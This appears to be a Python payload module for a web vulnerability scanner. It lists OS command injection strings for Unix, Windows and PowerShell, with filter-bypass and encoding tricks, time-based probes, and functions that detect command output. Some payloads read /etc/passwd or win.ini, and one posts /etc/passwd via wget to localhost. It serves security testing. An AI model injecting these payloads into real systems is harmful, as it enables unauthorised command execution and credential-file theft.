"""
scanner/payloads/command_injection.py

OS Command Injection payloads for vulnerability testing.
Covers: Unix/Linux, Windows, various injection techniques.

Categories:
1. Unix Basic Injection
2. Windows Injection
3. Filter Bypass Variations (${IFS}, $'\x20', brace expansion)
4. Encoded Payloads (base64, hex, octal)
5. Time-based Detection
6. PowerShell-specific
7. Chained Command Techniques
8. Variable Injection ($() variations)
9. Argument Injection (--flag=value patterns)
10. Wildcard Injection
"""

from .base import Payload


def cmdi_unix_confirm(response_text: str) -> bool:
    """
    Check for Unix command execution indicators.
    """
    indicators = [
        # id command output
        "uid=",
        "gid=",
        "groups=",
        "euid=",

        # whoami output
        "root",
        "www-data",
        "apache",
        "nginx",
        "nobody",

        # uname output
        "linux",
        "darwin",
        "freebsd",

        # File listing
        "drwx",
        "-rw-",
        "total ",

        # passwd file
        "/bin/bash",
        "/bin/sh",
        "/usr/sbin/nologin",

        # Directory listings
        "/home/",
        "/var/www",
        "/etc/",
    ]

    text_lower = response_text.lower()
    return any(indicator.lower() in text_lower for indicator in indicators)


def cmdi_windows_confirm(response_text: str) -> bool:
    """
    Check for Windows command execution indicators.
    """
    indicators = [
        # Windows paths
        "c:\\windows",
        "c:\\users",
        "c:\\program files",
        "system32",

        # Windows commands output
        "volume serial number",
        "directory of",
        "windows_nt",
        "computername",
        "username=",
        "userprofile",

        # Windows errors
        "is not recognized as an internal",
        "access is denied",

        # Environment variables
        "programfiles",
        "systemroot",
        "windir",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def cmdi_error_confirm(response_text: str) -> bool:
    """
    Check for command execution errors.
    """
    indicators = [
        # Unix errors
        "sh:",
        "bash:",
        "/bin/sh:",
        "command not found",
        "no such file or directory",
        "permission denied",
        "syntax error",
        "cannot execute",

        # Python subprocess
        "subprocess",
        "popen",
        "os.system",

        # PHP exec
        "shell_exec",
        "system(",
        "passthru",
        "exec(",

        # Node.js
        "child_process",
        "execsync",

        # Generic
        "execution error",
        "failed to execute",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def cmdi_powershell_confirm(response_text: str) -> bool:
    """
    Check for PowerShell command execution indicators.
    """
    indicators = [
        # PowerShell output
        "pshome",
        "psmodulepath",
        "powershell",
        "cmdlet",
        "get-",
        "set-",
        "new-",
        "invoke-",
        "write-host",
        "out-string",
        "psversion",
        "clrversion",
        "buildversion",
        # Environment
        "homedrive",
        "homepath",
        "appdata",
        "localappdata",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def cmdi_confirm(response_text: str) -> bool:
    """Combined confirmation for command injection."""
    return (cmdi_unix_confirm(response_text) or
            cmdi_windows_confirm(response_text) or
            cmdi_error_confirm(response_text) or
            cmdi_powershell_confirm(response_text))


COMMAND_INJECTION_PAYLOADS = [
    # ============================================
    # 1. UNIX BASIC INJECTION
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Semicolon injection",
        payload="; id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Pipe injection",
        payload="| id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Backtick injection",
        payload="`id`",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Command substitution",
        payload="$(id)",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="AND injection",
        payload="&& id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="OR injection",
        payload="|| id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Newline injection",
        payload="\nid",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Background execution",
        payload="& id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Double semicolon",
        payload=";; id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # ============================================
    # 2. WINDOWS INJECTION
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Windows pipe",
        payload="| dir",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Windows AND",
        payload="& dir",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Windows whoami",
        payload="| whoami",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Windows double AND",
        payload="&& dir",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Windows OR",
        payload="|| dir",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Windows systeminfo",
        payload="| systeminfo",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),

    # ============================================
    # 3. FILTER BYPASS VARIATIONS
    # ============================================
    # ${IFS} bypasses
    Payload(
        vuln_type="CommandInjection",
        name="IFS space bypass",
        payload=";${IFS}id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="IFS cat bypass",
        payload=";cat${IFS}/etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="IFS with variable",
        payload=";a]id;${IFS}$a",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="IFS9 bypass",
        payload=";{cat,/etc/passwd}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # $'\x20' hex space bypass
    Payload(
        vuln_type="CommandInjection",
        name="Hex space bypass",
        payload=";cat$'\\x20'/etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Hex tab bypass",
        payload=";cat$'\\x09'/etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # Brace expansion
    Payload(
        vuln_type="CommandInjection",
        name="Brace expansion cat",
        payload=";{cat,/etc/passwd}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Brace expansion ls",
        payload=";{ls,-la}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Brace expansion echo",
        payload=";{echo,test}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_error_confirm
    ),

    # Quote bypass
    Payload(
        vuln_type="CommandInjection",
        name="Single quote bypass",
        payload=";i'd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Double quote bypass",
        payload=';i"d"',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Backslash bypass",
        payload=";i\\d",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # Comment bypass
    Payload(
        vuln_type="CommandInjection",
        name="Comment termination",
        payload="; id #",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Null termination bypass",
        payload="; id %00",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # ============================================
    # 4. ENCODED PAYLOADS
    # ============================================
    # URL encoded
    Payload(
        vuln_type="CommandInjection",
        name="URL encoded semicolon",
        payload="%3B id",
        contexts=["url"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="URL encoded pipe",
        payload="%7C id",
        contexts=["url"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="URL encoded ampersand",
        payload="%26 id",
        contexts=["url"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="URL encoded newline",
        payload="%0A id",
        contexts=["url"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Double URL encoded semicolon",
        payload="%253B id",
        contexts=["url"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # Base64 encoded
    Payload(
        vuln_type="CommandInjection",
        name="Base64 decoded execution",
        payload=";echo aWQ= | base64 -d | sh",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Base64 whoami",
        payload=";echo d2hvYW1p | base64 -d | sh",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Base64 bash decode",
        payload=";bash -c '{echo,aWQ=}|{base64,-d}|{bash,-i}'",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # Hex encoded
    Payload(
        vuln_type="CommandInjection",
        name="Hex printf id",
        payload=";printf '\\x69\\x64' | sh",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Hex xxd decode",
        payload=";echo 6964 | xxd -r -p | sh",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # Octal encoded
    Payload(
        vuln_type="CommandInjection",
        name="Octal printf id",
        payload=";printf '\\151\\144' | sh",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Octal $'string'",
        payload=";$'\\151\\144'",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # Null byte
    Payload(
        vuln_type="CommandInjection",
        name="Null byte termination",
        payload="%00; id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # ============================================
    # 5. TIME-BASED DETECTION
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Sleep injection",
        payload="; sleep 5",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Sleep backtick",
        payload="`sleep 5`",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Sleep command substitution",
        payload="$(sleep 5)",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Ping injection (Unix)",
        payload="; ping -c 5 127.0.0.1",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Ping injection (Windows)",
        payload="| ping -n 5 127.0.0.1",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Timeout injection (Windows)",
        payload="| timeout /t 5",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Sleep with IFS",
        payload=";sleep${IFS}5",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Sleep OR chain",
        payload="|| sleep 5",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Sleep AND chain",
        payload="&& sleep 5",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),

    # ============================================
    # 6. POWERSHELL-SPECIFIC
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell whoami",
        payload="| powershell -c whoami",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell Get-Process",
        payload="| powershell -c Get-Process",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell encoded command",
        payload="| powershell -enc dwBoAG8AYQBtAGkA",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell IEX",
        payload='| powershell -c "IEX(whoami)"',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell env vars",
        payload="| powershell -c $env:USERNAME",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell Get-ChildItem",
        payload="| powershell -c Get-ChildItem",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell bypass execution policy",
        payload="| powershell -ep bypass -c whoami",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell noprofile",
        payload="| powershell -nop -c whoami",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell hidden window",
        payload="| powershell -w hidden -c whoami",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PowerShell sleep",
        payload="| powershell -c Start-Sleep -s 5",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_powershell_confirm
    ),

    # ============================================
    # 7. CHAINED COMMAND TECHNIQUES
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Triple chained semicolon",
        payload="; id; whoami; uname -a",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Mixed chain operators",
        payload="; id && whoami || uname",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Pipe chain",
        payload="| id | head -1",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Subshell chain",
        payload="; (id; whoami)",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Grouped commands",
        payload="; { id; whoami; }",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Windows chained",
        payload="& dir & whoami & hostname",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),

    # ============================================
    # 8. VARIABLE INJECTION ($() variations)
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Nested substitution",
        payload="$($(id))",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Variable assignment injection",
        payload=";a=id;$a",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Variable in string",
        payload=';a="id";$a',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Command in variable",
        payload=";cmd=id;$cmd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Array variable",
        payload=";a[0]=id;${a[0]}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Indirect reference",
        payload=";a=id;b=a;${!b}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="PATH variable abuse",
        payload=";PATH=/tmp:$PATH;id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Env var in subshell",
        payload="$(echo $PATH)",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # ============================================
    # 9. ARGUMENT INJECTION
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Flag injection long",
        payload="--help",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Flag injection short",
        payload="-h",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Flag with value",
        payload="--output=/tmp/test",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Tar argument injection",
        payload="--checkpoint=1 --checkpoint-action=exec=id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Git argument injection",
        payload="--upload-pack=id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Rsync argument injection",
        payload="-e 'id'",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Curl argument injection",
        payload="-o /tmp/x http://localhost",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Wget argument injection",
        payload="--post-file=/etc/passwd http://localhost",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),

    # ============================================
    # 10. WILDCARD INJECTION
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Wildcard expansion star",
        payload="; ls *",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Wildcard question mark",
        payload="; ls ?",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Wildcard bracket",
        payload="; ls [a-z]*",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Tar wildcard injection",
        payload="; tar cf archive.tar *",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Chown wildcard injection",
        payload="; chown user *",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_error_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Rsync wildcard injection",
        payload="; rsync -a * /tmp/",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_error_confirm
    ),

    # ============================================
    # 11. ENVIRONMENT VARIABLES
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Env var injection",
        payload="; echo $PATH",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Windows env var",
        payload="| echo %PATH%",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Home directory",
        payload="; echo $HOME",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="User variable",
        payload="; echo $USER",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # ============================================
    # 12. FILE OPERATIONS
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Cat /etc/passwd",
        payload="; cat /etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Type win.ini",
        payload="| type c:\\windows\\win.ini",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_windows_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Head /etc/passwd",
        payload="; head /etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Tail /etc/passwd",
        payload="; tail /etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Less /etc/passwd",
        payload="; less /etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),

    # ============================================
    # 13. SPECIAL CHARACTERS & ENCODING BYPASS
    # ============================================
    Payload(
        vuln_type="CommandInjection",
        name="Tab separator",
        payload="\tid",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Carriage return",
        payload="\rid",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Unicode newline",
        payload="\u2028id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Form feed",
        payload="\fid",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
    Payload(
        vuln_type="CommandInjection",
        name="Vertical tab",
        payload="\vid",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=cmdi_unix_confirm
    ),
]
